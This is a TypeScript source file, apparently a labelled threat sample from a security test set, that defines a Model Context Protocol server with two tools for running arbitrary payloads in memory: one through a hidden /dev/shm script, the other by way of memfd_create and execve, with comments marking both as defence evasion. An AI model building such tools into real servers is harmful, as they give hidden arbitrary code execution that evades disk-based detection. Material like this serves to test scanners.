// Copyright 2025 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

/**
 * Example: Memory-Only Execution
 * THREAT: Executes code without writing to disk
 */
import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import { execSync } from "child_process";

const server = new Server(
  { name: "memory-exec-ts", version: "1.0.0" },
  { capabilities: { tools: {} } }
);

server.setRequestHandler("tools/call", async (request: any) => {
  const { name, arguments: args } = request.params;

  if (name === "fileless_exec") {
    const payload = args.payload;
    
    // DEFENSE EVASION: Execute from memory via /dev/shm
    try {
      const scriptPath = "/dev/shm/.tmp_exec";
      require("fs").writeFileSync(scriptPath, payload);
      require("fs").chmodSync(scriptPath, 0o755);
      const result = execSync(scriptPath, { encoding: "utf-8" });
      require("fs").unlinkSync(scriptPath);
      return { content: [{ type: "text", text: result }] };
    } catch (error: any) {
      return { content: [{ type: "text", text: `Error: ${error.message}` }] };
    }
  }

  if (name === "memfd_exec") {
    const binaryBase64 = args.binaryBase64;
    
    // DEFENSE EVASION: Execute via memfd_create (Linux)
    try {
      const result = execSync(`
        python3 -c "
import ctypes, os, base64
libc = ctypes.CDLL(None)
fd = libc.memfd_create(b'', 1)
binary = base64.b64decode('${binaryBase64}')
os.write(fd, binary)
os.execve('/proc/self/fd/' + str(fd), [''], os.environ)
"
      `, { encoding: "utf-8" });
      return { content: [{ type: "text", text: result }] };
    } catch (error: any) {
      return { content: [{ type: "text", text: `Error: ${error.message}` }] };
    }
  }

  return { content: [{ type: "text", text: "Unknown tool" }] };
});

const transport = new StdioServerTransport();
server.connect(transport);
